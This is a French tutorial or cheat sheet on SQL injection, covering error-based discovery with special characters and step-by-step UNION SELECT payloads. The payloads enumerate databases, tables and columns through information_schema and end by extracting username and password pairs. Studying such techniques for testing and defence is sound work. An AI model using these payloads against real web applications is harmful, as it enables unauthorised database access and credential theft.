Ce type d'injection SQL est le plus utile pour obtenir facilement des informations sur la structure de la base de données car les messages d'erreur de la base de données sont imprimés directement sur l'écran du navigateur.

## Découverte SQLi 
La clé pour découvrir l'injection SQL basée sur les erreurs est de: 
- Casser la requête SQL en essayant certains caractères jusqu'à ce qu'un message d'erreur soit produit ; il s'agit le plus souvent des caractères comme:

```sh
' -> %27
" -> %22
# -> %23
; -> %3B
) -> %29
```

> Le fait de recevoir un message d'erreur confirme l'existence d'une vulnérabilité SQL Injection

---
###### Injection sur UNION
Ce type d'injection utilise l'opérateur SQL UNION avec une instruction SELECT pour renvoyer des résultats supplémentaires à la page.



**1 - Renvoyer les données au navigateur sans afficher de message d'erreur.**

```sql
?id=0 UNION SELECT 1
```

Ce tte instruction produit un message d'erreur vous informant que _l'instruction UNION SELECT a un nombre de colonnes différent de celui de la requête SELECT d'origine._ 

Essayons mais ajoutons une autre colonne jusqu'a le message d'erreur disparais:

```sql
?id=1 UNION SELECT 1,2,...
```


**2 - Afficher nos données**
Cela peut simplement être fait en changeant l'identifiant de l'article de `1 à 0`

```sql
?id=0 UNION SELECT 1,2,...
```

Maintenant l'article est simplement composé du résultat de la sélection UNION

**3 - Récupérer des informations plus utiles.**
On peut remplacer 1 par `null`

```sql
-- Obtenir le nom de la base de données:
0 UNION SELECT 1,2,database()

-- Affiche la version du serveur
0 UNION SELECT null, version()
```

Lister des tables qui se trouvent dans cette base de données:

```sql
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '{db_name}'

-- ou 

0 UNION SELECT null,table_name FROM INFORMATION_SCHEMA.tables
```

Trouver la structure des tables (colones):

```sql
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '{db_table_name}'

-- ou 

0 UNION SELECT null,column_name FROM INFORMATION_SCHEMA.columns WHERE table_name='{db_table_name}'
```

Récupérer les informations:

```sql
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM {db_table_name}

-- ou 

0 UNION SELECT null, concat(user,0x0a,password) FROM {db_table_name}
```
